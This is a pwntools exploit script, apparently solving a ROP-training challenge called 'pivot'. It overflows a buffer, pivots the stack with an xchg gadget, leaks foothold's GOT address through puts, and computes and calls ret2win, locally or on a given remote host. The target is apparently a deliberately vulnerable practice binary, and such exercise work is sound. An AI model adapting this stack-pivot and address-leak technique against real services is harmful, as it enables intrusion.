#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    xchgEAXESP = 0x0000000000400b03 #: xchg eax, esp ; ret
    xchgRAXRSP = 0x0000000000400b02 #: xchg rax, rsp ; ret
    popRAX = 0x0000000000400b00     #: pop rax ; ret
    popRDI = 0x0000000000400b73 #: pop rdi ; ret
    foothold_plt = 0x400850
    foothold_got = 0x602048
    foothold_offset = 0x970
    ret2win_offset = 0xABE
    puts = 0x400800
    main = 0x400996
    r.recvuntil("pivot: ")
    addr_pivot = r.recvn(14)
    print("Address to pivot to: ", addr_pivot)

    r.recvuntil("> ")
    rop = ""
    rop += p64(foothold_plt)    #call foothold plt to populate got 
    rop += p64(popRDI)          #put foothold got into RDI for arg1
    rop += p64(foothold_got)    #arg1
    rop += p64(puts)            #call puts; puts(foothold_got)
    rop +=p64(main)             #call main for stage2
    r.sendline(rop)


    r.recvuntil("> ")
    buf = ""
    buf += "A" * cyclic_find("faaaaaaa", n =8)
    buf += p64(popRAX)          #put addr given to, to change the stack frame
    buf += p64(eval(addr_pivot))                
    buf += p64(xchgRAXRSP)      #pivot
    r.sendline(buf)


    print r.recvuntil(".so")
    addr_from_put = r.recvn(6) + "\x00\x00"     #get leak from puts
    print(hex(u64(addr_from_put)))
    foothold_addr_got = u64(addr_from_put)
    ret2win = (foothold_addr_got - foothold_offset) + ret2win_offset    #calculate ret2win addr

    r.recvuntil("> ")
    buf3 = ""
    buf3 += "Y" * cyclic_find("faaaaaaa", n =8)
    buf3 += p64(ret2win)    #call ret2win
    r.sendline(buf3)


    r.recvuntil("> ")
    pay = ""
    pay += "Y"
    r.sendline(pay)

    r.interactive()
    return





if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./pivot"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x400AE1",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)
